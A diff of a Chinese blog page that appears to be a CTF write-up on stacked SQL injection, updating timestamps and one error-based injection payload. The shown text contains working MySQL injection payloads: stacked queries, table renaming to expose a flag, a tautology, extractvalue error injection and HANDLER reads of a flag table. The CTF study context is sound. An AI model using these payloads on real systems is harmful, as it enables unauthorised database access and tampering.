@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/31.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/php_web_ctf/34.png">
 <meta property="article:published_time" content="2021-03-27T06:29:13.000Z">
-<meta property="article:modified_time" content="2021-03-27T06:51:57.344Z">
+<meta property="article:modified_time" content="2021-03-27T06:54:16.395Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://www.tu3k.cn/images/php_web_ctf/32.png">
@@ -318,7 +318,7 @@
 <a id="more"></a>
 <h3 id="GYCTF"><a href="#GYCTF" class="headerlink" title="GYCTF"></a>GYCTF</h3><p>堆栈注入基本语句，首先如果要闭合语句先测试闭合语句并闭合好<br><code>1&#39;;show databases#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/32.png" alt="duizhan_sql" title="duizhan_sql"><br><img src="https://www.tu3k.cn/images/php_web_ctf/33.png" alt="duizhan_sql" title="duizhan_sql"><br>在GYCTF中，将alter也加入黑名单了<br>这比强网杯中的堆栈注入过滤的还多，强网杯中通过修改当前输入框id字段对应的表名和字段名来获取flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当在输入框输入1查询时，去words表中的id字段查，所以我们可以进行更改，将words表改成words1，flag表改成words表，通过修改字段名为id，来达到查询flag的目的</span><br><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1918xxxxxx&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100)#</span><br><span class="line">此时输入1就是去flag查询数据了，写个条件为真的语句直接出flag</span><br><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
-<p>尝试报错注入<br><code>1&#39; and extractvalue(1,concat(user(),0x7e,user()))#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/30.png" alt="duizhan_sql" title="duizhan_sql"><br><code>1&#39;;show tables;show columns from FlagHere#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/31.png" alt="duizhan_sql" title="duizhan_sql"><br>flag存放在FlagHere表中的flag字段内，报错注入查数据时还是被拦截了，这时候主角登场</p>
+<p>尝试报错注入<br><code>1&#39; and extractvalue(1,concat(&#39;~&#39;,user()))#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/30.png" alt="duizhan_sql" title="duizhan_sql"><br><code>1&#39;;show tables;show columns from FlagHere#</code><br><img src="https://www.tu3k.cn/images/php_web_ctf/31.png" alt="duizhan_sql" title="duizhan_sql"><br>flag存放在FlagHere表中的flag字段内，报错注入查数据时还是被拦截了，这时候主角登场</p>
 <h3 id="HANDLER语法"><a href="#HANDLER语法" class="headerlink" title="HANDLER语法"></a>HANDLER语法</h3><p>HANDLER table OPEN;         打开一个表，以便后面能直接读取表内的东西<br>HANDLER table READ FIRST;    读取表内第一条数据<br>HANDLER table CLOSE;        关闭资源</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler FlagHere OPEN;handler FlagHere READ FIRST;handler FlagHere CLOSE#</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.tu3k.cn/images/php_web_ctf/34.png" alt="duizhan_sql" title="duizhan_sql"></p>
@@ -334,7 +334,7 @@
         <p><span>Title:</span><a href="/2021/03/27/duizhan-sql/">堆栈注入_CTF</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
         <p><span>Created:</span>2021-03-27, 14:29:13</p>
-        <p><span>Updated:</span>2021-03-27, 14:51:57</p>
+        <p><span>Updated:</span>2021-03-27, 14:54:16</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/2021/03/27/duizhan-sql/" title="堆栈注入_CTF">https://www.tu3k.cn/2021/03/27/duizhan-sql/</a>
             <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/03/27/duizhan-sql/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
